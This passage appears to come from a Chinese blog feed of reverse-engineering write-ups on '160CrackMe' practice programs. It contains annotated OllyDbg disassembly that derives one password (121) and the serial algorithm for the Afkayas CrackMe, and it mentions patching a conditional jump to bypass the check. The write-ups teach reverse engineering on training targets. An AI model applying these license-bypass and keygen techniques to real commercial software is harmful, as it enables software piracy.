class="line">004010D7  |.  D9E4          ftst                                     ;  st0和0.0比较，据此设置FPU状态字C0,C2,C3位</span><br><span class="line">004010D9  |.  DFE0          fstsw ax</span><br><span class="line">004010DB  |.  F6C4 01       test ah,0x1</span><br><span class="line">004010DE  |.  74 02         je short 测试.004010E2</span><br><span class="line">004010E0  |.  D9E0          fchs                                     ;  st0改变符号位</span><br><span class="line">004010E2  |&gt;  DC1D 651B4800 fcomp qword ptr ds:[0x481B65]            ;  st0和[481B65](无限接近0的一个正浮点数)比较，据此设置FPU状态字C0,C2,C3位，并把st0弹到[481B65]</span><br><span class="line">004010E8  |.  DFE0          fstsw ax                                 ;  FPU状态字 -&gt; eax，根据下面可知，FPU状态字C0或C3为1均可</span><br><span class="line">004010EA  |.  F6C4 41       test ah,0x41                             ;  zf=0 -&gt; ah &amp; 0x41 != 0</span><br><span class="line">004010ED  |.  B8 00000000   mov eax,0x0</span><br><span class="line">004010F2  |.  0f95c0        setne al                                 ;  eax=1 -&gt; al=1 -&gt; zf=0</span><br><span class="line">004010F5  |.  8945 D0       mov [local.12],eax</span><br><span class="line">004010F8  |.  837D D0 01    cmp [local.12],0x1</span><br><span class="line">004010FC  |.  0F85 39000000 jnz 测试.0040113B                          ;  要求zf=1，即eax=0x1</span><br><span class="line">00401102  |.  BB 06000000   mov ebx,0x6</span><br><span class="line">00401107  |.  E8 F8FEFFFF   call 测试.00401004</span><br><span class="line">0040110C  |.  68 01030080   push 0x80000301</span><br><span class="line">00401111  |.  6A 00         push 0x0</span><br><span class="line">00401113  |.  68 00000000   push 0x0</span><br><span class="line">00401118  |.  68 04000080   push 0x80000004</span><br><span class="line">0040111D  |.  6A 00         push 0x0</span><br><span class="line">0040111F  |.  68 6D1B4800   push 测试.00481B6D                         ;  成功</span><br><span class="line">00401124  |.  68 04000000   push 0x4</span><br><span class="line">00401129  |.  BB 90164000   mov ebx,测试.00401690</span><br><span class="line">0040112E  |.  E8 36010000   call 测试.00401269</span><br><span class="line">00401133  |.  83C4 34       add esp,0x34</span><br><span class="line">00401136  |.  E9 34000000   jmp 测试.0040116F</span><br><span class="line">0040113B  |&gt;  BB 06000000   mov ebx,0x6</span><br><span class="line">00401140  |.  E8 BFFEFFFF   call 测试.00401004</span><br><span class="line">00401145  |.  68 01030080   push 0x80000301</span><br><span class="line">0040114A  |.  6A 00         push 0x0</span><br><span class="line">0040114C  |.  68 00000000   push 0x0</span><br><span class="line">00401151  |.  68 04000080   push 0x80000004</span><br><span class="line">00401156  |.  6A 00         push 0x0</span><br><span class="line">00401158  |.  68 721B4800   push 测试.00481B72                         ;  失败</span><br><span class="line">0040115D  |.  68 04000000   push 0x4</span><br></pre></td></tr></table></figure></p>
<p>那么回到上面的问题，ah的值是从哪来的，我们在<code>004010E8</code>处可以看到，FPU状态码进了eax<br>那么根据我们的判断<code>ah &amp; 0x41 != 0</code>，能得出对FPU状态字有什么要求呢？<br>我们看这张图<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fjo0im7jh7j20g70bqt93.jpg" alt=""></p>
<p>也就是说<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    0100 0001</span><br><span class="line">&amp;   -x-- -yzt</span><br><span class="line">----------------</span><br><span class="line">    真</span><br><span class="line">其中x代表C3，y代表C2，z代表C1,t代表C0</span><br></pre></td></tr></table></figure></p>
<p>根据上面的判断，也就是说<strong>只能C3或C0为1</strong>  </p>
<ul>
<li>C3为1的话  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004010E2  |&gt;  DC1D 651B4800 fcomp qword ptr ds:[0x481B65]            ;  st0和[481B65](无限接近0的一个正浮点数)比较，据此设置FPU状态字C0,C2,C3位，并把st0弹到[481B65]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这段就是st0等于一个无限接近0的浮点数才能使C3为1，但是根据我们之前的<code>st0 = st0 = 你的输入+520-641</code>，st0不可能是等于一个无限接近0的浮点数，所以<strong>C3为1排除</strong>  <a href="http://x86.renejeschke.de/html/file_module_x86_id_87.html" target="_blank" rel="noopener">fcomp命令参考处</a></p>
<ul>
<li>C0为1的话<br>C0为1是怎么来的呢？只有两个地方涉及到了FPU状态字的改变，分别是<code>4010D7</code>和<code>4010E2</code><br><code>4010E2</code>处要使C0为1，必须st0小于那个无限接近0的浮点数，这个条件不足以我们判断，接着往上看<br><code>4010D7</code>处要使C0为1，必须st0等于0.0，也就是<code>你的输入+520-641=0</code>  <a href="http://x86.renejeschke.de/html/file_module_x86_id_123.html" target="_blank" rel="noopener">ftst命令参考处</a></li>
</ul>
<p>所以至此我们就得到了密码<br>密码+520-641=0      ==&gt;     密码=121<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fjo0ir8du4j20am070a9y.jpg" alt=""></p>
<p>这个CM怎么说呢，我刚开始是没想到会涉及到浮点寄存器的，因为我还没学这个，不过后来追到快判断的地方时，发现了FPU状态码进入eax参与过程了，然后查了关于FPU 状态寄存器的资料，就可以搞出来了</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>CrackMe</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>160CrackMe练手 002</title>
    <url>/2017/09/16/160CrackMe-002.html</url>
    <content><![CDATA[<p>首先查壳无壳，输入伪码报错，根据报错od查找字符串，定位到错误代码附近，可以看到有个条件跳转，改掉就可以爆破，接下来分析下注册算法，我们周围看看，从最近几个call看，并没有我们输入的用户名在堆栈中出现，那我们直接从这个函数开头往下找，一般一个函数开头是push ebp一段代码用来提升堆栈，找到后我们往下找，注意堆栈，直到我们输入的字符出现，开始细心往下跟<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00402310   &gt; \55            push ebp</span><br><span class="line">00402311   .  8BEC          mov ebp,esp</span><br><span class="line">00402313   .  83EC 0C       sub esp,0xC</span><br><span class="line">00402316   .  68 26104000   push &lt;jmp.&amp;MSVBVM50.__vbaExceptHandler&gt;  ;  SE 处理程序安装</span><br><span class="line">0040231B   .  64:A1 0000000&gt;mov eax,dword ptr fs:[0]</span><br><span class="line">00402321   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">00402322   .  64:8925 00000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">00402329   .  81EC B0000000 sub esp,0xB0</span><br><span class="line">0040232F   .  53            push ebx</span><br><span class="line">00402330   .  56            push esi</span><br><span class="line">00402331   .  8B75 08       mov esi,dword ptr ss:[ebp+0x8]           ;  esi -&gt; ASCII &quot;2@&quot;</span><br><span class="line">00402334   .  57            push edi</span><br><span class="line">00402335   .  8BC6          mov eax,esi                              ;  eax -&gt; ASCII &quot;2@&quot;</span><br><span class="line">00402337   .  83E6 FE       and esi,-0x2</span><br><span class="line">0040233A   .  8965 F4       mov dword ptr ss:[ebp-0xC],esp</span><br><span class="line">0040233D   .  83E0 01       and eax,0x1</span><br><span class="line">00402340   .  8B1E          mov ebx,dword ptr ds:[esi]</span><br><span class="line">00402342   .  C745 F8 08104&gt;mov dword ptr ss:[ebp-0x8],Afkayas_.0040&gt;</span><br><span class="line">00402349   .  56            push esi</span><br><span class="line">0040234A   .  8945 FC       mov dword ptr ss:[ebp-0x4],eax           ;  Afkayas_.00402191</span><br><span class="line">0040234D   .  8975 08       mov dword ptr ss:[ebp+0x8],esi</span><br><span class="line">00402350   .  FF53 04       call dword ptr ds:[ebx+0x4]              ;  msvbvm50.7404C5C8</span><br><span class="line">00402353   .  8B83 10030000 mov eax,dword ptr ds:[ebx+0x310]</span><br><span class="line">00402359   .  33FF          xor edi,edi</span><br><span class="line">0040235B   .  56            push esi</span><br><span class="line">0040235C   .  897D E8       mov dword ptr ss:[ebp-0x18],edi</span><br><span class="line">0040235F   .  897D E4       mov dword ptr ss:[ebp-0x1C],edi</span><br><span class="line">00402362   .  897D E0       mov dword ptr ss:[ebp-0x20],edi</span><br><span class="line">00402365   .  897D DC       mov dword ptr ss:[ebp-0x24],edi</span><br><span class="line">00402368   .  897D D8       mov dword ptr ss:[ebp-0x28],edi</span><br><span class="line">0040236B   .  897D D4       mov dword ptr ss:[ebp-0x2C],edi</span><br><span class="line">0040236E   .  897D C4       mov dword ptr ss:[ebp-0x3C],edi</span><br><span class="line">00402371   .  897D B4       mov dword ptr ss:[ebp-0x4C],edi</span><br><span class="line">00402374   .  897D A4       mov dword ptr ss:[ebp-0x5C],edi</span><br><span class="line">00402377   .  897D 94       mov dword ptr ss:[ebp-0x6C],edi</span><br><span class="line">0040237A   .  8985 40FFFFFF mov dword ptr ss:[ebp-0xC0],eax          ;  Afkayas_.00402191</span><br><span class="line">00402380   .  FFD0          call eax                                 ;  Afkayas_.00402191</span><br><span class="line">00402382   .  8D4D D4       lea ecx,dword ptr ss:[ebp-0x2C]</span><br><span class="line">00402385   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">00402386   .  51            push ecx</span><br><span class="line">00402387   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</span><br><span class="line">0040238D   .  8B9B 00030000 mov ebx,dword ptr ds:[ebx+0x300]</span><br><span class="line">00402393   .  56            push esi</span><br><span class="line">00402394   .  8985 50FFFFFF mov dword ptr ss:[ebp-0xB0],eax          ;  Afkayas_.00402191</span><br><span class="line">0040239A   .  899D 3CFFFFFF mov dword ptr ss:[ebp-0xC4],ebx</span><br><span class="line">004023A0   .  FFD3          call ebx</span><br><span class="line">004023A2   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</span><br><span class="line">004023A5   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004023A6   .  52            push edx</span><br><span class="line">004023A7   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</span><br><span class="line">004023AD   .  8BD8          mov ebx,eax                              ;  Afkayas_.00402191</span><br><span class="line">004023AF   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004023B2   .  51            push ecx</span><br><span class="line">004023B3   .  53            push ebx</span><br><span class="line">004023B4   .  8B03          mov eax,dword ptr ds:[ebx]</span><br><span class="line">004023B6   .  FF90 A0000000 call dword ptr ds:[eax+0xA0]</span><br><span class="line">004023BC   .  3BC7          cmp eax,edi</span><br><span class="line">004023BE   .  7D 12         jge short Afkayas_.004023D2</span><br><span class="line">004023C0   .  68 A0000000   push 0xA0</span><br><span class="line">004023C5   .  68 5C1B4000   push Afkayas_.00401B5C</span><br><span class="line">004023CA   .  53            push ebx</span><br><span class="line">004023CB   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004023CC   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">004023D2   &gt;  56            push esi</span><br><span class="line">004023D3   .  FF95 3CFFFFFF call dword ptr ss:[ebp-0xC4]</span><br><span class="line">004023D9   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</span><br><span class="line">004023DC   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004023DD   .  52            push edx</span><br><span class="line">004023DE   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</span><br><span class="line">004023E4   .  8BD8          mov ebx,eax                              ;  Afkayas_.00402191</span><br><span class="line">004023E6   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">004023E9   .  51            push ecx</span><br><span class="line">004023EA   .  53            push ebx</span><br><span class="line">004023EB   .  8B03          mov eax,dword ptr ds:[ebx]</span><br><span class="line">004023ED   .  FF90 A0000000 call dword ptr ds:[eax+0xA0]</span><br><span class="line">004023F3   .  3BC7          cmp eax,edi</span><br><span class="line">004023F5   .  7D 12         jge short Afkayas_.00402409</span><br><span class="line">004023F7   .  68 A0000000   push 0xA0</span><br><span class="line">004023FC   .  68 5C1B4000   push Afkayas_.00401B5C</span><br><span class="line">00402401   .  53            push ebx</span><br><span class="line">00402402   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">00402403   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">00402409   &gt;  8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]</span><br><span class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  用户名 -&gt; eax</span><br><span class="line">00402412   .  50            push eax                                 ; /用户名 -&gt; 堆栈</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \len(用户名) -&gt; eax</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                              ;  len(用户名) -&gt; edi</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]          ;  用户名 -&gt; ecx</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                     ;  len(用户名) * 0x17CFB ==&gt; edi=A6ADD</span><br><span class="line">00402426   .  51            push ecx                                 ; /String = NULL</span><br><span class="line">00402427   .  0F80 91020000 jo Afkayas_.004026BE                     ; |</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \用户名去掉首字母 -&gt; edx</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax</span><br><span class="line">00402436   .  03FA          add edi,edx</span><br><span class="line">00402438   .  0F80 80020000 jo Afkayas_.004026BE</span><br><span class="line">0040243E   .  57            push edi                                 ;  len(用户名) * 0x17CFB 入栈-&gt; ebp-D4</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  -&gt; eax</span><br><span class="line">00402445   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</span><br><span class="line">00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">0040244A   .  FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMo&gt;;  msvbvm50.__vbaStrMove</span><br><span class="line">00402450   .  8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]</span><br><span class="line">00402456   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">00402457   .  57            push edi                                 ;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  入栈  -&gt; ebp-D4</span><br><span class="line">00402458   .  FF93 A4000000 call dword ptr ds:[ebx+0xA4]</span><br><span class="line">0040245E   .  85C0          test eax,eax                             ;  Afkayas_.00402191</span><br><span class="line">00402460   .  7D 12         jge short Afkayas_.00402474</span><br><span class="line">00402462   .  68 A4000000   push 0xA4</span><br><span class="line">00402467   .  68 5C1B4000   push Afkayas_.00401B5C</span><br><span class="line">0040246C   .  57            push edi</span><br><span class="line">0040246D   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">0040246E   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">00402474   &gt;  8D45 E0       lea eax,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402477   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">0040247A   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">0040247B   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0040247E   .  51            push ecx</span><br><span class="line">0040247F   .  52            push edx</span><br><span class="line">00402480   .  6A 03         push 0x3</span><br><span class="line">00402482   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStrList</span><br><span class="line">00402488   .  83C4 10       add esp,0x10</span><br><span class="line">0040248B   .  8D45 D4       lea eax,dword ptr ss:[ebp-0x2C]</span><br><span class="line">0040248E   .  8D4D D8       lea ecx,dword ptr ss:[ebp-0x28]</span><br><span class="line">00402491   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</span><br><span class="line">00402494   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">00402495   .  51            push ecx</span><br><span class="line">00402496   .  52            push edx</span><br><span class="line">00402497   .  6A 03         push 0x3</span><br><span class="line">00402499   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;;  msvbvm50.__vbaFreeObjList</span><br><span class="line">0040249F   .  8B06          mov eax,dword ptr ds:[esi]</span><br><span class="line">004024A1   .  83C4 10       add esp,0x10</span><br><span class="line">004024A4   .  56            push esi</span><br><span class="line">004024A5   .  FF90 04030000 call dword ptr ds:[eax+0x304]</span><br><span class="line">004024AB   .  8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaOb&gt;;  msvbvm50.__vbaObjSet</span><br><span class="line">004024B1   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004024B2   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">004024B5   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004024B6   .  FFD3          call ebx                                 ;  &lt;&amp;MSVBVM50.__vbaObjSet&gt;</span><br><span class="line">004024B8   .  8BF8          mov edi,eax                              ;  Afkayas_.00402191</span><br><span class="line">004024BA   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004024BD   .  52            push edx</span><br><span class="line">004024BE   .  57            push edi</span><br><span class="line">004024BF   .  8B0F          mov ecx,dword ptr ds:[edi]</span><br><span class="line">004024C1   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</span><br><span class="line">004024C7   .  85C0          test eax,eax                             ;  Afkayas_.00402191</span><br><span class="line">004024C9   .  7D 12         jge short Afkayas_.004024DD</span><br><span class="line">004024CB   .  68 A0000000   push 0xA0</span><br><span class="line">004024D0   .  68 5C1B4000   push Afkayas_.00401B5C</span><br><span class="line">004024D5   .  57            push edi</span><br><span class="line">004024D6   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004024D7   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">004024DD   &gt;  56            push esi</span><br><span class="line">004024DE   .  FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]</span><br><span class="line">004024E4   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004024E5   .  8D45 D8       lea eax,dword ptr ss:[ebp-0x28]</span><br><span class="line">004024E8   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004024E9   .  FFD3          call ebx</span><br><span class="line">004024EB   .  8BF0          mov esi,eax                              ;  Afkayas_.00402191</span><br><span class="line">004024ED   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">004024F0   .  52            push edx</span><br><span class="line">004024F1   .  56            push esi</span><br><span class="line">004024F2   .  8B0E          mov ecx,dword ptr ds:[esi]</span><br><span class="line">004024F4   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</span><br><span class="line">004024FA   .  85C0          test eax,eax                             ;  Afkayas_.00402191</span><br><span class="line">004024FC   .  7D 12         jge short Afkayas_.00402510</span><br><span class="line">004024FE   .  68 A0000000   push 0xA0</span><br><span class="line">00402503   .  68 5C1B4000   push Afkayas_.00401B5C</span><br><span class="line">00402508   .  56            push esi</span><br><span class="line">00402509   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">0040250A   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]          ;  user32.77D2BBF7</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 -&gt; ecx       密码 -&gt; eax</span><br><span class="line">0040251C   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">0040251D   .  68 701B4000   push Afkayas_.00401B70                   ;  &quot;AKA-&quot;入栈</span><br><span class="line">00402522   .  51            push ecx                                 ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈</span><br><span class="line">00402523   .  FFD7          call edi                                 ; \&quot;AKA-&quot;+&quot;十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值&quot;   -&gt;  eax</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;;  msvbvm50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                 ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCm&gt;;  msvbvm50.__vbaStrCmp</span><br><span class="line">00402539   .  8BF0          mov esi,eax                              ;  Afkayas_.00402191</span><br><span class="line">0040253B   .  8D55 E0       lea edx,dword ptr ss:[ebp-0x20]</span><br><span class="line">0040253E   .  F7DE          neg esi</span><br><span class="line">00402540   .  8D45 E8       lea eax,dword ptr ss:[ebp-0x18]</span><br><span class="line">00402543   .  52            push edx</span><br><span class="line">00402544   .  1BF6          sbb esi,esi</span><br><span class="line">00402546   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00402549   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">0040254A   .  46            inc esi</span><br><span class="line">0040254B   .  51            push ecx</span><br><span class="line">0040254C   .  6A 03         push 0x3</span><br><span class="line">0040254E   .  F7DE          neg esi</span><br><span class="line">00402550   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStrList</span><br><span class="line">00402556   .  83C4 10       add esp,0x10</span><br><span class="line">00402559   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</span><br><span class="line">0040255C   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">0040255F   .  52            push edx</span><br><span class="line">00402560   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">00402561   .  6A 02         push 0x2</span><br><span class="line">00402563   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;;  msvbvm50.__vbaFreeObjList</span><br><span class="line">00402569   .  83C4 0C       add esp,0xC</span><br><span class="line">0040256C   .  B9 04000280   mov ecx,0x80020004</span><br><span class="line">00402571   .  B8 0A000000   mov eax,0xA</span><br><span class="line">00402576   .  894D 9C       mov dword ptr ss:[ebp-0x64],ecx</span><br><span class="line">00402579   .  66:85F6       test si,si</span><br><span class="line">0040257C   .  8945 94       mov dword ptr ss:[ebp-0x6C],eax          ;  Afkayas_.00402191</span><br><span class="line">0040257F   .  894D AC       mov dword ptr ss:[ebp-0x54],ecx</span><br><span class="line">00402582   .  8945 A4       mov dword ptr ss:[ebp-0x5C],eax          ;  Afkayas_.00402191</span><br><span class="line">00402585   .  894D BC       mov dword ptr ss:[ebp-0x44],ecx</span><br><span class="line">00402588   .  8945 B4       mov dword ptr ss:[ebp-0x4C],eax          ;  Afkayas_.00402191</span><br><span class="line">0040258B   .  74 58         je short Afkayas_.004025E5</span><br><span class="line">0040258D   .  68 801B4000   push Afkayas_.00401B80                   ;  You Get It</span><br><span class="line">00402592   .  68 9C1B4000   push Afkayas_.00401B9C                   ;  \r\n</span><br><span class="line">00402597   .  FFD7          call edi</span><br><span class="line">00402599   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</span><br><span class="line">0040259B   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0040259E   .  FFD3          call ebx</span><br><span class="line">004025A0   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004025A1   .  68 A81B4000   push Afkayas_.00401BA8                   ;  KeyGen It Now</span><br><span class="line">004025A6   .  FFD7          call edi</span><br><span class="line">004025A8   .  8D4D 94       lea ecx,dword ptr ss:[ebp-0x6C]</span><br><span class="line">004025AB   .  8945 CC       mov dword ptr ss:[ebp-0x34],eax          ;  Afkayas_.00402191</span><br><span class="line">004025AE   .  8D55 A4       lea edx,dword ptr ss:[ebp-0x5C]</span><br><span class="line">004025B1   .  51            push ecx</span><br><span class="line">004025B2   .  8D45 B4       lea eax,dword ptr ss:[ebp-0x4C]</span><br><span class="line">004025B5   .  52            push edx</span><br><span class="line">004025B6   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004025B7   .  8D4D C4       lea ecx,dword ptr ss:[ebp-0x3C]</span><br><span class="line">004025BA   .  6A 00         push 0x0</span><br><span class="line">004025BC   .  51            push ecx</span><br><span class="line">004025BD   .  C745 C4 08000&gt;mov dword ptr ss:[ebp-0x3C],0x8</span><br><span class="line">004025C4   .  FF15 10414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcMsgBox&gt;;  msvbvm50.rtcMsgBox</span><br><span class="line">004025CA   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004025CD   .  FF15 80414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStr</span><br><span class="line">004025D3   .  8D55 94       lea edx,dword ptr ss:[ebp-0x6C]</span><br><span class="line">004025D6   .  8D45 A4       lea eax,dword ptr ss:[ebp-0x5C]</span><br><span class="line">004025D9   .  52            push edx</span><br><span class="line">004025DA   .  8D4D B4       lea ecx,dword ptr ss:[ebp-0x4C]</span><br><span class="line">004025DD   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004025DE   .  8D55 C4       lea edx,dword ptr ss:[ebp-0x3C]</span><br><span class="line">004025E1   .  51            push ecx</span><br><span class="line">004025E2   .  52            push edx</span><br><span class="line">004025E3   .  EB 56         jmp short Afkayas_.0040263B</span><br><span class="line">004025E5   &gt;  68 C81B4000   push Afkayas_.00401BC8                   ;  You Get Wrong</span><br><span class="line">004025EA   .  68 9C1B4000   push Afkayas_.00401B9C                   ;  \r\n</span><br><span class="line">004025EF   .  FFD7          call edi</span><br><span class="line">004025F1   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</span><br><span class="line">004025F3   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004025F6   .  FFD3          call ebx</span><br><span class="line">004025F8   .  50            push eax                                 ;  Afkayas_.00402191</span><br><span class="line">004025F9   .  68 E81B4000   push Afkayas_.00401BE8                   ;  Try Again</span><br></pre></td></tr></table></figure>
<p>通过分析可以看到加密关键代码是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  用户名 -&gt; eax</span><br><span class="line">00402412   .  50            push eax                                 ; /用户名 -&gt; 堆栈</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \len(用户名) -&gt; eax</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                              ;  len(用户名) -&gt; edi</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]          ;  用户名 -&gt; ecx</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                     ;  len(用户名) * 0x17CFB ==&gt; edi=A6ADD</span><br><span class="line">00402426   .  51            push ecx                                 ; /String = NULL</span><br><span class="line">00402427   .  0F80 91020000 jo Afkayas_.004026BE                     ; |</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \用户名去掉首字母 -&gt; edx</span><br><span class="line">0040243E   .  57            push edi                                 ;  len(用户名) * 0x17CFB 入栈-&gt; ebp-D4</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  -&gt; eax</span><br><span class="line">0040251D   .  68 701B4000   push Afkayas_.00401B70                   ;  &quot;AKA-&quot;入栈</span><br><span class="line">00402522   .  51            push ecx                                 ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈</span><br><span class="line">00402523   .  FFD7          call edi                                 ; \&quot;AKA-&quot;+&quot;十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值&quot;   -&gt;  eax</span><br></pre></td></tr></table></figure></p>
<p>可以看出流程就是 “AKA-“+”十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值”  </p>
